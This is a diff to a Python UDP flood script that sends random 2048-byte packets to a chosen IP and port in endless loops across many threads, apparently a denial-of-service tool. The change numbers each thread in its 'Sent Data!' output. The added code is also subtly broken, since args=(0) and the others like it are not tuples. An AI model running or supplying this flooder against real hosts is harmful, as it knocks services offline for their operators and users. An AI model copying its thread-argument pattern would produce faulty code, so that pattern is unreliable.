@@ -19,7 +19,7 @@ choice = args['choice']
 times = args['times']
 threads = args['threads']
 
-def run():
+def run(hjl):
 	data = random._urandom(2048)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
@@ -28,7 +28,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Sent!!!")
+			print(i +" Sent Data! thread-"+str(hjl))
 		except:
 			print("[!] Error!!!")
 
@@ -49,25 +49,25 @@ def run2():
 
 for y in range(threads):
 	if choice == 'y':
-		th = threading.Thread(target = run)
+		th = threading.Thread(target = run,args=(0))
 		th.start()
-		th1 = threading.Thread(target = run)
+		th1 = threading.Thread(target = run,args=(1))
 		th1.start()
-		th2 = threading.Thread(target = run)
+		th2 = threading.Thread(target = run,args=(2))
 		th2.start()
-		th3 = threading.Thread(target = run)
+		th3 = threading.Thread(target = run,args=(3))
 		th3.start()
-		th4 = threading.Thread(target = run)
+		th4 = threading.Thread(target = run,args=(4))
 		th4.start()
-		th5 = threading.Thread(target = run)
+		th5 = threading.Thread(target = run,args=(5))
 		th5.start()
-		th6 = threading.Thread(target = run)
+		th6 = threading.Thread(target = run,args=(6))
 		th6.start()
-		th7 = threading.Thread(target = run)
+		th7 = threading.Thread(target = run,args=(7))
 		th7.start()
-		th8 = threading.Thread(target = run)
+		th8 = threading.Thread(target = run,args=(8))
 		th8.start()
-		th9 = threading.Thread(target = run)
+		th9 = threading.Thread(target = run,args=(9))
 		th9.start()
 	else:
 		th = threading.Thread(target = run2)
